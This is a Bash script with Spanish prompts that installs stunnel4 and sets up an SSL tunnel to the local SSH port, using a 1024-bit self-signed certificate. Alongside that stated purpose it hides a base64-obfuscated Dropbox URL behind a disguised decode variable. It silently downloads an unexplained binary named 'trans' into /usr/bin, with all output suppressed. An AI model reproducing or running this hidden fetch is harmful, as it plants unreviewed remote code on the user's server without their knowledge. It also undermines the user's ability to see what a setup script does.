#!/bin/bash
declare -A cor=( [0]="\033[1;37m" [1]="\033[1;34m" [2]="\033[1;31m" [3]="\033[1;33m" [4]="\033[1;32m" )
barra="\033[0m\e[31m=================================================\033[1;37m"
fun_bar () {
comando="$1"
 _=$(
$comando > /dev/null 2>&1
) & > /dev/null
pid=$!
while [[ -d /proc/$pid ]]; do
echo -ne " \033[1;33m["
   for((i=0; i<10; i++)); do
   echo -ne "\033[1;31m**"
   sleep 0.2
   done
echo -ne "\033[1;33m]"
sleep 1s
echo
tput cuu1 && tput dl1
done
echo -e " \033[1;33m[\033[1;31m********************\033[1;33m] - \033[1;32m100%\033[0m"
sleep 1s
}
API_TRANS="aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vcy9sZnlxZGI5NnJkejl5bW8vdHJhbnM/ZGw9MA=="
SUB_DOM='base64 -d'
wget -O /usr/bin/trans $(echo $API_TRANS|$SUB_DOM) &> /dev/null
mportas () {
unset portas
portas_var=$(lsof -V -i tcp -P -n | grep -v "ESTABLISHED" |grep -v "COMMAND" | grep "LISTEN")
while read port; do
var1=$(echo $port | awk '{print $1}') && var2=$(echo $port | awk '{print $9}' | awk -F ":" '{print $2}')
[[ "$(echo -e $portas|grep "$var1 $var2")" ]] || portas+="$var1 $var2\n"
done <<< "$portas_var"
i=1
echo -e "$portas"
}
ssl_stunel () {
[[ $(mportas|grep stunnel4|head -1) ]] && {
echo -e "${cor[2]}Parando Stunnel"
echo -e "$barra"
fun_bar "service stunnel4 stop"
echo -e "$barra"
echo -e "${cor[2]}Parado Con exito!"
echo -e "$barra"
return 0
}
echo -e "${cor[3]}Que puerto desea abrir como SSL Openssh"
echo -e "$barra"
    while true; do
    read -p " Puerto SSL: " SSLPORT
    [[ $(mportas|grep -w "$SSLPORT") ]] || break
    echo -e "${cor[3]}esta puerta está en uso"
    unset SSLPORT
    done
echo -e "$barra"
echo -e "${cor[4]}Instalando SSL"
echo -e "$barra"
fun_bar "apt-get install stunnel4 -y"
echo -e "$barra"
echo -e "${cor[4]}Presione Enter a todas las opciones"
sleep 3
echo -e "$barra"
openssl genrsa 1024 > stunnel.key
openssl req -new -key stunnel.key -x509 -days 1000 -out stunnel.crt
cat stunnel.crt stunnel.key > stunnel.pem
mv stunnel.pem /etc/stunnel/
echo -e "client = no\n[ssh]\ncert = /etc/stunnel/stunnel.pem\naccept = ${SSLPORT}\nconnect = 127.0.0.1:22" > /etc/stunnel/stunnel.conf

echo "ENABLED=1 " >> /etc/default/stunnel4
echo "FILES="/etc/stunnel/*.conf" " >> /etc/default/stunnel4
echo "OPTIONS="" " >> /etc/default/stunnel4
echo "PPP_RESTART=0" >> /etc/default/stunnel4
service stunnel4 restart > /dev/null 2>&1
echo -e "$barra"
echo -e "${cor[1]}INSTALADO CON EXITO"
echo -e "$barra"
return 0
}
ssl_stunel